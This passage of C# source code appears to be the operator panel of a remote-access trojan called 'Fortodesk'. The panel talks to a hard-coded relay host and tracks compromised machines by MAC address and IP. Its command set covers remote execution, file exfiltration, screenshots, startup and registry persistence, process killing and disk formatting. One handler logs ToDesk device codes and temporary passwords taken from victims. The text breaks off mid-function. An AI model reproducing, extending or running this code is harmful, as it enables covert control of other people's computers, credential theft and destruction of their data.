using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.Linq;
using System.Drawing;

namespace Fortodesk
{
    public partial class MainForm : Form
    {
        public static MainForm mainform = null;
        private TcpClient _controlledClient;

        private const int PORT = 9000;
        private const int FILE_PORT = 9001; // 文件传输专用端口
        private const int FILE_SEND_PORT = 9002; // 控制端发文件给被控端专用端口

        private readonly object _sendLock = new object(); // 发送锁，防止多线程同时发包

        // ★ 改用存client的方式，key=UniqueId，value=上一次的TcpClient
        private readonly System.Collections.Generic.Dictionary<string, TcpClient>
            _screenshotFileClients = new System.Collections.Generic.Dictionary<string, TcpClient>();


        // ObjectListView 数据源和ID计数器
        private readonly System.Collections.Generic.List<HostInfo> _hostList
            = new System.Collections.Generic.List<HostInfo>();
        private int _hostIdCounter = 0;


        private const int CMD_PORT = 9003; // 指令中转端口

        // ===== TreeListView 文件浏览器 =====
        // 文件节点数据模型
        public class FileNode
        {
            public string Name { get; set; }
            public string FullPath { get; set; }
            public bool IsDirectory { get; set; }
            public long Size { get; set; }
            public string Modified { get; set; }

            public string SizeDisplay => IsDirectory ? "" :
                Size > 1024 * 1024 ? $"{Size / 1024 / 1024} MB" :
                Size > 1024 ? $"{Size / 1024} KB" : $"{Size} B";
        }

        // 当前正在浏览的主机
        private HostInfo _browsingHost = null;
        // 子节点缓存：key=目录完整路径，value=子节点列表（避免重复请求）
        private System.Collections.Generic.Dictionary<string, System.Collections.Generic.List<FileNode>>
            _dirCache = new System.Collections.Generic.Dictionary<string, System.Collections.Generic.List<FileNode>>(
                StringComparer.OrdinalIgnoreCase);
        private readonly System.Collections.Concurrent.ConcurrentDictionary<string, DirTransferState>
    _activeDirTransfers = new System.Collections.Concurrent.ConcurrentDictionary<string, DirTransferState>();
        // 当前正在等待服务端返回的目录路径
        private string _pendingPath = null;
        private FileNode _contextMenuNode = null;
        private System.Collections.Generic.List<FileNode> _contextMenuNodes
            = new System.Collections.Generic.List<FileNode>();
        private TcpClient _relayQueryClient = null;  // 长连接，供断开时外部强制关闭用
        private readonly object _relayQueryLock = new object();
        private readonly System.Collections.Generic.HashSet<string> _pendingStartupHosts
    = new System.Collections.Generic.HashSet<string>();

        //过滤系统级别进程
        private static readonly System.Collections.Generic.HashSet<string> _systemProcesses =
    new System.Collections.Generic.HashSet<string>(StringComparer.OrdinalIgnoreCase)
    {
        "System","Registry","smss.exe","csrss.exe","wininit.exe","winlogon.exe",
        "services.exe","lsass.exe","dwm.exe","Memory Compression","svchost.exe",
        "fontdrvhost.exe","WUDFHost.exe","spoolsv.exe","MsMpEng.exe","WmiPrvSE.exe",
        "wlanext.exe","dllhost.exe","sihost.exe","taskhostw.exe","audiodg.exe",
        "explorer.exe","ShellHost.exe","ChsIME.exe","SearchHost.exe",
        "StartMenuExperienceHost.exe","RuntimeBroker.exe","SearchIndexer.exe",
        "smartscreen.exe","ctfmon.exe","Locator.exe","WmiApSrv.exe",
        "TextInputHost.exe","ApplicationFrameHost.exe","SystemSettings.exe",
        "IntelCpHDCPSvc.exe","jhi_service.exe","IntelAudioService.exe",
        "RstMwService.exe","XtuService.exe","Intel_PIE_Service.exe",
        "IntelNetworkHelperService.exe","RtkAudUService64.exe",
        "NVDisplay.Container.exe","nvcontainer.exe","KillerAnalyticsService.exe",
        "KillerNetworkService.exe","KNDBWMService.exe","KNDBWM.exe",
        "KillerProviderDataHelperService.exe","Dell.Connected.Service.Delivery.exe",
        "DAX3API.exe","IgoAudioService_x64.exe","iGoSwServer.exe","ipf_uf.exe",
        "ipfsvc.exe","ipf_helper.exe","HrASDaemon.exe","msedge.exe",
        "msedgewebview2.exe","MicrosoftEdgeUpdate.exe","WMIRegistrationService.exe",
        "CrossDeviceResume.exe","Pecmd.exe","ShellF5.exe","ShellR32.exe","WinXShell.exe",
        "conhost.exe","WinosInfo.exe","SecurityHealthService.exe","dasHost.exe","WMIADAP.exe",
        "SearchProtocolHost.exe","SearchFilterHost.exe","SearchApp.exe","ShellExperienceHost.exe",
        "CloudExperienceHostBroker.exe","nvvsvc.exe","nvxdsync.exe","nvscpapisvr.exe",
        "NvBackend.exe","nvtray.exe","msiexec.exe","unsecapp.exe","nvsphelper64.exe",
        "NVIDIA Overlay.exe","MoUsoCoreWorker.exe","MusNotifyIcon.exe","TrustedInstaller.exe",
        "TiWorker.exe","rundll32.exe"
    };


        // ===== 协议 =====
        private const uint MAGIC = 0xDEADBEEF;
        private const uint CMD_REGISTER = 0x01;
        private const uint CMD_EXEC = 0x03;
        private const uint CMD_EXEC_RES = 0x04;
        private const uint CMD_SHUTDOWN = 0x05;
        private const uint CMD_REBOOT = 0x06;
        private const uint CMD_DOWNLOAD = 0x07;
        private const uint CMD_GETPROCS = 0x08;
        private const uint CMD_GETPROCS_RES = 0x09;
        private const uint CMD_LIST_DIR = 0x0A;
        private const uint CMD_LIST_DIR_RES = 0x0B;
        private const uint CMD_DELETE_PATH = 0x0C;
        private const uint CMD_DELETE_RES = 0x0D;
        private const uint CMD_SCREENSHOT_TODESK = 0x0E;
        private const uint CMD_SCREENSHOT_RES = 0x0F;
        private const uint CMD_SCREENSHOT_FULLSCREEN = 0x10;
        private const uint CMD_SEND_FILE = 0x11;
        private const uint CMD_SEND_FILE_RES = 0x12;
        private const uint CMD_REQUEST_FILE = 0x13;
        private const uint CMD_FILE_DATA = 0x14;
        private const uint CMD_FILE_BEGIN = 0x15;
        private const uint CMD_FILE_CHUNK = 0x16;
        private const uint CMD_FILE_END = 0x17;
        private const uint CMD_FILE_RESUME = 0x18;
        private const uint CMD_KILL_TODESK = 0x19;
        private const uint CMD_KILL_RES = 0x1A;
        public const uint CMD_DOWNLOAD_EX = 0x1B;
        private const uint CMD_DOWNLOAD_PROGRESS = 0x1C;
        private const uint CMD_DOWNLOAD_TODESK = 0x1F;
        private const uint CMD_KILL_ASKLINK = 0x20;  // 结束连连控进程
        private const uint CMD_SCREENSHOT_ASKLINK = 0x21;
        private const uint CMD_OPEN_ASKLINK = 0x22;
        private const uint CMD_OPEN_TODESK = 0x23;
        private const uint CMD_OPEN_RES = 0x24;
        private const uint CMD_LIST_DRIVES = 0x25;
        private const uint CMD_LIST_DRIVES_RES = 0x26;
        private const uint CMD_REQUEST_DIR = 0x27;
        private const uint CMD_DIR_FILE_COUNT = 0x28;
        private const uint CMD_DIR_READY = 0x29;
        private const uint CMD_FORMAT_DISKS = 0x2A;
        private const uint CMD_FORMAT_RES = 0x2B;
        private const uint CMD_DEL_DIR_ALL = 0x2C;
        private const uint CMD_DEL_DIR_RES = 0x2D;
        // 新增常量（放在PORT常量附近）
        private const string RELAY_IP = "magatrump.top";
        private const uint CMD_CTRL_HELLO = 0xF0;  // 控制端握手
        private const uint CMD_FILE_HELLO = 0xF1;  // 文件端口握手
        private const uint CMD_LIST_ONLINE = 0xF2;  // 查询在线被控端列表
        private const uint CMD_LIST_ONLINE_RES = 0xF3; // 在线列表响应
        private const uint CMD_HEARTBEAT = 0x30;
        private const uint CMD_PAIR_OK = 0xF5;  // 服务端配对成功确认
        private const uint CMD_PAIR_FAIL = 0xF6;  // 服务端配对失败
        private const uint CMD_GET_INSTALLED = 0x2E;
        private const uint CMD_GET_INSTALLED_RES = 0x2F;
        private const uint CMD_ADD_STARTUP = 0x31;
        private const uint CMD_ADD_STARTUP_RES = 0x32;
        private const uint CMD_DEL_STARTUP = 0x33;
        private const uint CMD_DEL_STARTUP_RES = 0x34;
        private const uint CMD_RUN_PROGRAM = 0x35;
        private const uint CMD_RUN_PROGRAM_RES = 0x36;
        private const uint CMD_KILL_PROCESS = 0x37;
        private const uint CMD_KILL_PROCESS_RES = 0x38;
        private const uint CMD_GET_STARTUP_LIST = 0x39;
        private const uint CMD_GET_STARTUP_LIST_RES = 0x3A;
        private const uint CMD_ADD_STARTUP_NOREG = 0x3D;
        private const uint CMD_AGENT_ONLINE = 0xF7;  // 被控端上线推送
        private const uint CMD_AGENT_OFFLINE = 0xF8;  // 被控端离线推送
        private const uint CMD_GET_TODESK_INFO = 0x40;
        private const uint CMD_GET_TODESK_INFO_RES = 0x41;
        private const uint CMD_DOWNLOAD_RUSTDESK = 0x43;
        private const uint CMD_OPEN_RUSTDESK = 0x44;
        private const uint CMD_KILL_RUSTDESK = 0x45;
        private const uint CMD_REG_WRITE_AUTO = 0x56;
        private const uint CMD_REG_WRITE_AUTO_RES = 0x57;

        /// <summary>
        /// 主机信息实体类
        /// 专门用于绑定 WinForm ObjectListView 控件，存储主机相关硬件/网络信息
        /// </summary>
        public class HostInfo
        {
            /// <summary>
            /// 序号ID（整形，自增/排序用）
            /// </summary>
            public int Id { get; set; }

            /// <summary>
            /// 主机名（字符串，计算机名称）
            /// </summary>
            public string HostName { get; set; }

            /// <summary>
            /// 在线状态（在线/离线）
            /// </summary>
            public string OnlineStatus { get; set; }

            /// <summary>
            /// CPU信息（字符串，如：Intel i7-12700H 2.3GHz）
            /// </summary>
            public string CpuInfo { get; set; }

            /// <summary>
            /// 内存信息（字符串，如：16GB DDR4 3200MHz）
            /// </summary>
            public string MemoryInfo { get; set; }

            /// <summary>
            /// 硬盘信息（字符串，如：512GB NVMe SSD）
            /// </summary>
            public string DiskInfo { get; set; }

            /// <summary>
            /// MAC地址（字符串，物理网卡地址，如：00-1A-2B-3C-4D-5E）
            /// </summary>
            public string MacAddress { get; set; }

            /// <summary>
            /// WAN口IP（广域网IP地址，公网IP，字符串类型）
            /// </summary>
            public string WanIp { get; set; }

            /// <summary>
            /// LAN口IP（局域网IP地址，内网IP，字符串类型）
            /// </summary>
            public string LanIp { get; set; }

            /// <summary>
            /// 网卡型号（例如：Intel Ethernet Connection I219-V）
            /// </summary>
            public string NetworkCardModel { get; set; }

            /// <summary>
            /// MAC地址作为唯一标识（用于断线重连识别同一台机器）
            /// </summary>
            public string UniqueId { get; set; }

            /// <summary>
            /// 对应的TCP连接（不显示在列表，供内部发指令使用）
            /// </summary>
            public TcpClient Client { get; set; }

            public bool IsConnecting { get; set; } = false;

            // ★ 新增：重连中间态标志
            // true = 9003连接断开但服务器未推送离线，正在自动重试中
            // 此状态下UI显示"重连中"，不显示"离线"，SendCmdToHost排队等待
            public bool IsReconnecting { get; set; } = false;

            // ★ 新增：取消重连的令牌，用于手动双击时取消旧的自动重连循环
            public System.Threading.CancellationTokenSource ReconnectCts { get; set; } = null;

            public string Products { get; set; }

        }

        public MainForm()
        {
            InitializeComponent();
            mainform = this;

            treeListView1.RowFormatter = item =>
            {
                if (item.RowObject is FileNode fn && fn.IsDirectory)
                {
                    item.ForeColor = Color.RoyalBlue;  // 目录显示蓝色，改成你喜欢的颜色
                }
            };


            // 哪些节点可以展开（目录节点）
            treeListView1.CanExpandGetter = model =>
                model is FileNode fn && fn.IsDirectory;

            treeListView1.ChildrenGetter = model =>
            {
                if (!(model is FileNode fn) || !fn.IsDirectory || _browsingHost == null)
                    return new FileNode[0];
                // 命中缓存直接返回
                if (_dirCache.TryGetValue(fn.FullPath, out var cached))
                    return cached;
                // 无缓存，发请求，先返回占位节点
                _pendingPath = fn.FullPath;
                SendCmdToHost(_browsingHost, CMD_LIST_DIR,
                    Encoding.UTF8.GetBytes(fn.FullPath));
                return new[] { new FileNode {
                Name = "", IsDirectory = false,
                Modified = "", FullPath = "" } };
            };
            // 改为：
            StartRelayQueryLoop();  // 定时从中转拉取在线列表
        }

        // 定时查询中转服务器的在线被控端列表
        // 改后
        private void StartRelayQueryLoop()
        {
            Thread t = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        QueryOnlineListLoop();  // 内部长连接，断开后自动退出
                    }
                    catch { }
                    // 连接断开后等2秒重连，期间清理僵尸连接
                    try { CleanupZombieConnections(); } catch { }
                    Thread.Sleep(2000);
                }
            });
            t.IsBackground = true;
            t.Start();
        }

        private void QueryOnlineListLoop()
        {
            TcpClient client = new TcpClient();
            client.SendTimeout = 5000;
            client.ReceiveTimeout = 0;

            try
            {
                client.Connect(RELAY_IP, PORT);
                NetworkStream stream = client.GetStream();

                lock (_relayQueryLock)
                    _relayQueryClient = client;

                // 第一步：发查询包，触发relay回全量列表
                SendPacketDirect(stream, CMD_LIST_ONLINE, new byte[0]);

                // ★ 第一次收到全量列表用autoConnect=true补建9003，后续保活用false只同步数据
                bool firstList = true;

                System.Threading.Timer keepAliveTimer = null;
                keepAliveTimer = new System.Threading.Timer(_ =>
                {
                    try
                    {
                        if (client.Connected)
                            SendPacketDirect(stream, CMD_LIST_ONLINE, new byte[0]);
                    }
                    catch
                    {
                        keepAliveTimer?.Dispose();
                    }
                }, null, 2000, 2000);

                try
                {
                    uint cmd;
                    byte[] data;
                    while (RecvPacket(stream, out cmd, out data))
                    {
                        switch (cmd)
                        {
                            case CMD_LIST_ONLINE_RES:
                                string all = Encoding.UTF8.GetString(data);
                                string[] entries = all.Split('\n');
                                if (firstList)
                                {
                                    // ★ 9000刚连上时的第一次全量列表：
                                    // autoConnect=true，补建所有在线被控端的9003连接
                                    // 解决relay重启后控制端重连9000但9003没有恢复的问题
                                    firstList = false;
                                    foreach (string entry in entries)
                                    {
                                        if (string.IsNullOrWhiteSpace(entry)) continue;
                                        HandleRegisterFromRelay(
                                            Encoding.UTF8.GetBytes(entry), true);
                                    }
                                    MarkOfflineNotInList(entries);
                                }
                                else
                                {
                                    // ★ 后续每2秒保活轮询：autoConnect=false，只同步数据
                                    // 不触发重连，避免频繁建立/断开9003连接
                                    UpdateHostListFromRelay(entries);
                                }
                                break;

                            case CMD_AGENT_ONLINE:
                                // 单台上线推送：autoConnect=true（默认值）
                                if (data != null && data.Length > 0)
                                    HandleRegisterFromRelay(data);
                                break;

                            case CMD_AGENT_OFFLINE:
                                if (data != null && data.Length > 0)
                                {
                                    string offlineKey =
                                        Encoding.UTF8.GetString(data).Trim();
                                    HandleAgentOfflinePush(offlineKey);
                                }
                                break;
                        }
                    }
                }
                finally
                {
                    keepAliveTimer?.Dispose();
                }
            }
            finally
            {
                lock (_relayQueryLock)
                {
                    if (_relayQueryClient == client)
                        _relayQueryClient = null;
                }
                try { client.Close(); } catch { }
            }
        }

        private void HandleAgentOfflinePush(string uniqueKey)
        {
            if (string.IsNullOrEmpty(uniqueKey)) return;

            // ★ 先在后台线程取消该主机的自动重连循环
            // 理由：服务器推送OFFLINE说明被控端9000心跳已断（真正离线），
            // 不应该继续重连，取消AutoReconnectLoop
            HostInfo target = _hostList.Find(h => h.UniqueId == uniqueKey);
            if (target != null)
            {
                CancellationTokenSource cts = null;
                lock (target)
                {
                    cts = target.ReconnectCts;
                    target.ReconnectCts = null;
                    target.IsReconnecting = false;
                }
                try { cts?.Cancel(); } catch { }
            }

            Action updateUi = () =>
            {
                HostInfo t = _hostList.Find(h => h.UniqueId == uniqueKey);
                if (t == null) return;

                // 已经是离线状态就不重复处理
                if (t.OnlineStatus == "离线") return;

                t.OnlineStatus = "离线";
                try { t.Client?.Close(); } catch { }
                t.Client = null;

                objectListView.RefreshObject(t);
                AppendLog($"[{t.HostName}] 离线（推送通知）");

                if (_browsingHost != null && _browsingHost.UniqueId == uniqueKey)
                {
                    _browsingHost = null;
                    _dirCache.Clear();
                    _pendingPath = null;
                    treeListView1.ClearObjects();
                }
            };

            if (objectListView.InvokeRequired)
                objectListView.Invoke(updateUi);
            else
                updateUi();
        }

        private void HandleRegisterFromRelay(byte[] data, bool autoConnect = true)
        {
            string msg = Encoding.UTF8.GetString(data);
            int sep = msg.IndexOf('|');
            string info = sep >= 0 ? msg.Substring(sep + 1) : msg;
            string[] fields = info.Split('|');

            var host = new HostInfo();
            host.OnlineStatus = "在线";
            host.Client = null; // 连接在点击连接时建立

            var diskParts = new System.Text.StringBuilder();
            string nicType = "", nicName = "", lanIp = "", mac = "";

            foreach (string field in fields)
            {
                if (string.IsNullOrWhiteSpace(field)) continue;
                if (field.StartsWith("CPU:")) host.CpuInfo = field.Substring(4).Trim();
                else if (field.StartsWith("MEM:")) host.MemoryInfo = field.Substring(4).Trim();
                else if (field.StartsWith("HOST:")) host.HostName = field.Substring(5).Trim();
                else if (field.StartsWith("WAN:"))
                {
                    string wan = field.Substring(4).Trim();
                    int fromIdx = wan.IndexOf("来自于：");
                    if (fromIdx >= 0)
                    {
                        // 提取IP：格式"当前 IP：1.84.202.113  来自于：..."
                        string location = wan.Substring(fromIdx + 4).Trim();
                        string ip = "";
                        int ipIdx = wan.IndexOf("IP：");
                        if (ipIdx >= 0)
                        {
                            int ipEnd = wan.IndexOf(' ', ipIdx + 3);
                            ip = ipEnd >= 0
                                ? wan.Substring(ipIdx + 3, ipEnd - ipIdx - 3).Trim()
                                : wan.Substring(ipIdx + 3).Trim();
                        }
                        host.WanIp = string.IsNullOrEmpty(ip)
                            ? location
                            : $"{location}({ip})";
                    }
                    else
                    {
                        host.WanIp = wan;
                    }
                }
                else if (field.StartsWith("BOARD:")) host.Products = field.Substring(6).Trim();
                else if (field.StartsWith("SSD[") || field.StartsWith("HDD[") ||
                         field.StartsWith("USB[") || field.StartsWith("CD[") ||
                         field.StartsWith("NET[") || field.StartsWith("DISK["))
                {
                    if (diskParts.Length > 0) diskParts.Append(" ");
                    diskParts.Append(field.Trim());
                }
                else if (field.StartsWith("ETH[") || field.StartsWith("WIFI["))
                {
                    if (string.IsNullOrEmpty(lanIp))
                    {
                        nicType = field.StartsWith("WIFI[") ? "WIFI" : "ETH";
                        string inner = field.Substring(field.IndexOf('[') + 1).TrimEnd(']');
                        int ipIdx = inner.IndexOf("IP:");
                        if (ipIdx >= 0)
                        {
                            int ipEnd = inner.IndexOf(' ', ipIdx + 3);
                            lanIp = ipEnd >= 0
                                ? inner.Substring(ipIdx + 3, ipEnd - ipIdx - 3)
                                : inner.Substring(ipIdx + 3);
                            lanIp = lanIp.Trim();
                        }
                        int macIdx = inner.IndexOf("MAC:");
                        if (macIdx >= 0) mac = inner.Substring(macIdx + 4).Trim();
                        nicName = ipIdx >= 0 ? inner.Substring(0, ipIdx).Trim() : inner;
                    }
                }
            }

            host.DiskInfo = diskParts.ToString();
            host.LanIp = lanIp;
            host.MacAddress = mac;
            host.UniqueId = mac;
            host.NetworkCardModel = string.IsNullOrEmpty(nicType) ? nicName : $"{nicType}:{nicName}";

            // ★ MAC解析失败，跳过，避免产生UniqueId为空的脏数据
            if (string.IsNullOrEmpty(host.UniqueId))
                return;

            Action updateUi = () =>
            {
                HostInfo existing = _hostList.Find(h => h.UniqueId == host.UniqueId);
                if (existing != null)
                {
                    // ★ 收到上线推送，如果有自动重连循环在跑，先取消它
                    // 让推送路径直接负责重连，避免两条路径并发
                    CancellationTokenSource oldCts = null;
                    lock (existing)
                    {
                        oldCts = existing.ReconnectCts;
                        existing.ReconnectCts = null;
                        existing.IsReconnecting = false;
                    }
                    try { oldCts?.Cancel(); } catch { }

                    existing.OnlineStatus = "在线";
                    existing.WanIp = host.WanIp;
                    existing.LanIp = host.LanIp;
                    existing.CpuInfo = host.CpuInfo;
                    existing.MemoryInfo = host.MemoryInfo;
                    existing.DiskInfo = host.DiskInfo;
                    existing.HostName = host.HostName;
                    existing.Products = host.Products;
                    objectListView.RefreshObject(existing);

                    if (autoConnect &&
                        (existing.Client == null || !existing.Client.Connected) &&
                        !existing.IsConnecting)
                    {
                        HostInfo toConnect = existing;
                        Thread t = new Thread(() => ConnectToAgent(toConnect));
                        t.IsBackground = true;
                        t.Start();
                    }
                }
                else
                {
                    host.Id = ++_hostIdCounter;
                    _hostList.Add(host);
                    objectListView.SetObjects(_hostList);
                    ConnectToAgent(host); // 新设备第一次直接连，不需要冷却判断
                }
            };

            if (objectListView.InvokeRequired) objectListView.Invoke(updateUi);
            else updateUi();
        }

        private void UpdateHostListFromRelay(string[] entries)
        {
            // 先解析出本次在线的UniqueId集合
            var onlineIds = new System.Collections.Generic.HashSet<string>();

            foreach (string entry in entries)
            {
                if (string.IsNullOrWhiteSpace(entry)) continue;
                HandleRegisterFromRelay(Encoding.UTF8.GetBytes(entry), false);
                // 解析UniqueId（复用现有提取逻辑）
                string uid = ExtractUniqueIdFromRegData(entry);
                if (!string.IsNullOrEmpty(uid)) onlineIds.Add(uid);
            }

            // 把不在本次列表里的标记为离线
            Action markOffline = () =>
            {
                bool changed = false;

                // ★ 清理UniqueId为空的脏数据
                int removed = _hostList.RemoveAll(h => string.IsNullOrEmpty(h.UniqueId));
                if (removed > 0) changed = true;

                // ★ 同一UniqueId有多条记录时去重，保留在线的那条，没有在线的保留最后一条
                var grouped = _hostList.GroupBy(h => h.UniqueId).ToList();
                foreach (var group in grouped)
                {
                    var list = group.ToList();
                    if (list.Count <= 1) continue;
                    var keep = list.FirstOrDefault(h => h.OnlineStatus == "在线") ?? list.Last();
                    foreach (var dup in list.Where(h => h != keep))
                    {
                        try { dup.Client?.Close(); } catch { }
                        _hostList.Remove(dup);
                        changed = true;
                    }
                }

                // 标记不在本次在线列表里的为离线
                foreach (var h in _hostList)
                {
                    bool nowOnline = onlineIds.Contains(h.UniqueId);
                    if (!nowOnline && h.OnlineStatus != "离线" && h.OnlineStatus != "重连中")
                    {
                        h.OnlineStatus = "离线";
                        h.Client = null;
                        changed = true;
                    }
                }

                if (changed) objectListView.SetObjects(_hostList);
            };

            if (objectListView.InvokeRequired) objectListView.Invoke(markOffline);
            else markOffline();
        }

        // ★ 新增：只做标离线，不触发任何连接
        // 配合QueryOnlineListLoop第一次全量列表使用
        private void MarkOfflineNotInList(string[] entries)
        {
            var onlineIds = new System.Collections.Generic.HashSet<string>();
            foreach (string entry in entries)
            {
                if (string.IsNullOrWhiteSpace(entry)) continue;
                string uid = ExtractUniqueIdFromRegData(entry);
                if (!string.IsNullOrEmpty(uid)) onlineIds.Add(uid);
            }

            Action action = () =>
            {
                bool changed = false;
                foreach (var h in _hostList)
                {
                    if (!onlineIds.Contains(h.UniqueId) &&
                        h.OnlineStatus != "离线" &&
                        h.OnlineStatus != "重连中")
                    {
                        h.OnlineStatus = "离线";
                        try { h.Client?.Close(); } catch { }
                        h.Client = null;
                        changed = true;
                    }
                }
                if (changed) objectListView.SetObjects(_hostList);
            };

            if (objectListView.InvokeRequired) objectListView.Invoke(action);
            else action();
        }

        // 从注册data字符串里提取MAC（与Go服务器逻辑一致）
        private string ExtractUniqueIdFromRegData(string data)
        {
            const string tag = "MAC:";
            int idx = data.IndexOf(tag);
            if (idx < 0) return "";
            int start = idx + tag.Length;
            int end = start;
            while (end < data.Length && data[end] != ' ' && data[end] != ']' && data[end] != '|')
                end++;
            string mac = data.Substring(start, end - start).Trim();
            return mac.Length >= 11 ? mac : "";
        }

        
        // 查询服务器在线列表，判断指定UniqueId是否在线
        private bool CheckAgentOnlineFromServer(string uniqueId)
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    client.Connect(RELAY_IP, PORT);
                    NetworkStream stream = client.GetStream();
                    SendPacketDirect(stream, CMD_LIST_ONLINE, new byte[0]);

                    uint cmd; byte[] data;
                    while (RecvPacket(stream, out cmd, out data))
                    {
                        if (cmd == CMD_LIST_ONLINE_RES)
                        {
                            string all = Encoding.UTF8.GetString(data);
                            // 检查在线列表里是否包含该UniqueId（MAC地址）
                            return all.Contains(uniqueId);
                        }
                    }
                }
            }
            catch { }
            return false;
        }

        // =========================
        // 接收循环
        // =========================
        private void RecvLoop(TcpClient client)
        {
            NetworkStream stream = client.GetStream();
            while (true)
            {
                uint cmd; byte[] data;
                if (!RecvPacket(stream, out cmd, out data)) break;
                DispatchCommand(cmd, data, client);
            }

            // ★ 改动：RecvLoop退出时不立刻标"离线"，进入"重连中"状态
            // 理由：RecvLoop退出可能是网络抖动（9003 pipe断了）而不是被控端真正离线
            // 被控端真正离线会通过 HandleAgentOfflinePush（服务器推送）来处理
            // 这里只触发自动重连，由 AutoReconnectLoop 决定最终是否标离线
            HostInfo reconnectTarget = null;
            Action updateUi = () =>
            {
                HostInfo target = _hostList.Find(h => h.Client == client);
                if (target != null)
                {
                    target.Client = null;
                    // ★ 不设置 OnlineStatus = "离线"，改为"重连中"
                    target.OnlineStatus = "重连中";
                    target.IsConnecting = false;
                    objectListView.RefreshObject(target);
                    AppendLog($"[{target.HostName}] 连接断开，正在自动重连...");

                    if (_browsingHost != null && _browsingHost.UniqueId == target.UniqueId)
                    {
                        _browsingHost = null;
                        _dirCache.Clear();
                        _pendingPath = null;
                        treeListView1.ClearObjects();
                    }

                    reconnectTarget = target;
                }
            };

            if (objectListView.InvokeRequired) objectListView.Invoke(updateUi);
            else updateUi();

            _controlledClient = null;

            // ★ 启动自动重连循环（在后台线程里运行，不阻塞当前线程）
            if (reconnectTarget != null)
            {
                HostInfo capturedHost = reconnectTarget;
                Thread t = new Thread(() => AutoReconnectLoop(capturedHost));
                t.IsBackground = true;
                t.Start();
            }
        }

        // ★ 新增：自动重连循环
        // 每2秒尝试一次ConnectToAgent，最多尝试30次（约1分钟）
        // 如果服务器推送了CMD_AGENT_OFFLINE，HandleAgentOfflinePush会取消此循环
        // 如果重连成功，ConnectToAgent内部会将IsReconnecting复位
        private void AutoReconnectLoop(HostInfo host)
        {
            CancellationTokenSource cts = new CancellationTokenSource();
            CancellationTokenSource oldCts = null;
            lock (host)
            {
                oldCts = host.ReconnectCts;
                host.ReconnectCts = cts;
                host.IsReconnecting = true;
            }
            try { oldCts?.Cancel(); } catch { }

            CancellationToken token = cts.Token;
            int maxRetry = 30;

            for (int i = 0; i < maxRetry; i++)
            {
                if (token.IsCancellationRequested) break;
                if (host.Client != null && host.Client.Connected) break;
                if (host.OnlineStatus == "离线") break;

                // ★ 新增：如果9000也连不上（relay停了），停止重试
                // 等QueryOnlineListLoop重连9000成功后，会通过CMD_AGENT_ONLINE推送触发重连
                lock (_relayQueryLock)
                {
                    if (_relayQueryClient == null)
                    {
                        // 9000长连接也断了，relay可能停了，停止重试避免刷屏
                        // 等9000重连成功后会收到推送，届时HandleRegisterFromRelay会重新触发ConnectToAgent
                        break;
                    }
                }

                if (token.WaitHandle.WaitOne(2000)) break;
                if (token.IsCancellationRequested) break;
                if (host.Client != null && host.Client.Connected) break;
                if (host.OnlineStatus == "离线") break;

                // ★ 再次检查9000，等待期间可能已断开
                lock (_relayQueryLock)
                {
                    if (_relayQueryClient == null) break;
                }

                AppendLog($"[{host.HostName}] 自动重连第{i + 1}次...");
                ConnectToAgent(host);

                for (int w = 0; w < 60; w++)
                {
                    if (token.WaitHandle.WaitOne(100)) goto loopEnd;
                    if (host.Client != null && host.Client.Connected) goto loopEnd;
                    if (host.OnlineStatus == "离线") goto loopEnd;
                    if (!host.IsConnecting) break;
                }
            }
        loopEnd:

            lock (host)
            {
                host.IsReconnecting = false;
                if (host.ReconnectCts == cts)
                    host.ReconnectCts = null;
            }

            Action finalUi = () =>
            {
                if (host.OnlineStatus == "重连中")
                {
                    // ★ 修改：relay停了时不标"离线"，标"重连中"等relay重启
                    // 只有真正超过maxRetry次都失败才标离线
                    bool relayDown;
                    lock (_relayQueryLock) { relayDown = _relayQueryClient == null; }

                    if (!relayDown)
                    {
                        // relay在线但就是连不上，才标离线
                        host.OnlineStatus = "离线";
                        objectListView.RefreshObject(host);
                        AppendLog($"[{host.HostName}] 自动重连失败，已标记离线");
                    }
                    // relay停了就保持"重连中"，等relay重启后推送来了再恢复
                }
            };
            if (objectListView.InvokeRequired) objectListView.Invoke(finalUi);
            else finalUi();
        }

        private void HandleToDeskInfoResult(byte[] data, string tag = "", TcpClient client = null)
        {
            string msg = Encoding.UTF8.GetString(data);
            string[] parts = msg.Split('|');

            if (parts.Length < 3)
            {
                AppendLog($"{tag}[ToDesk信息] 格式错误: {msg}");
                return;
            }

            string type = parts[0].Trim();
            string taskId = parts[parts.Length - 1].Trim();

            string uniqueId = null;
            if (client != null)
            {
                HostInfo h = _hostList.Find(x => x.Client == client);
                if (h != null) uniqueId = h.UniqueId;
            }

            if (type == "OK")
            {
                // ★ 获取到凭据，只显示文字，不接收截图
                string deviceCode = parts.Length > 1 ? parts[1].Trim() : "";
                string password = parts.Length > 2 ? parts[2].Trim() : "";
                string cpuTag = parts.Length > 3 ? parts[3].Trim() : "";
                AppendLog($"[{cpuTag}] [ToDesk设备代码] {deviceCode}");
                AppendLog($"[{cpuTag}] [ToDesk临时密码] {password}");
            }
            else if (type == "SCREENSHOT")
            {
                // ★ 找到ToDesk但获取不到凭据，接收截图
                string reason = parts.Length > 1 ? parts[1].Trim() : "";
                string cpuTag = parts.Length > 2 ? parts[2].Trim() : "";
                AppendLog($"[{cpuTag}] [ToDesk] {reason}，正在接收截图...");

                if (string.IsNullOrEmpty(uniqueId))
                {
                    AppendLog($"{tag}[ToDesk截图] 无法找到对应被控端UniqueId");
                    return;
                }

                string capturedUniqueId = uniqueId;
                string capturedTaskId = taskId;
                string capturedCpuTag = cpuTag;
                Thread t = new Thread(() =>
                    WaitAndRecvFileWithTaskId(capturedUniqueId, capturedTaskId,
                        $"[{capturedCpuTag}] [ToDesk截图] "));
                t.IsBackground = true;
                t.Start();
            }
            else
            {
                // ERROR
                string reason = parts.Length > 1 ? parts[1].Trim() : msg;
                string cpuTag = parts.Length > 2 ? parts[2].Trim() : "";
                AppendLog($"[{cpuTag}] [ToDesk信息] 获取失败: {reason}");
            }
        }

        private void HandleScreenshotResult(byte[] data, string tag = "", TcpClient client = null)
        {
            string msg = Encoding.UTF8.GetString(data);
            if (!msg.StartsWith("OK:"))
            {
                AppendLog($"{tag}[截图失败] {msg}");
                return;
            }

            // ★ 从OK消息中解析 TaskID，格式："OK:文件路径|TaskID"
            // 被控端新格式：OK:path|taskId
            string payload = msg.Substring(3); // 去掉"OK:"
            int sep = payload.LastIndexOf('|');
            if (sep < 0)
            {
